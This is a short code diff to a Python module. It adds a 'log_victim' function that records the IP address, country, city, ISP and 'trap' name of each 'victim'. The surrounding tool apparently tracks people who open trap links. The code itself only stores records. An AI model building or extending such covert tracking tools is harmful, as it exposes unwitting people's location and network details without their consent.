@@ -163,6 +163,23 @@ def log_victim_data(ip_address, user_agent, referrer, geo_data=None):
     victims.append(victim_entry)
     save_victims(victims)
 
+def log_victim(ip, country, city, isp, trap_name):
+    """تسجيل بيانات الضحية بشكل مبسط (الاسم المطلوب في app.py)"""
+    victims = load_victims()
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    victim_entry = {
+        'timestamp': timestamp,
+        'ip_address': ip,
+        'country': country,
+        'city': city,
+        'isp': isp,
+        'trap_name': trap_name
+    }
+    
+    victims.append(victim_entry)
+    save_victims(victims)
+
 def get_all_victims():
     """الحصول على قائمة الضحايا (الاسم المطلوب في app.py)"""
     return load_victims()
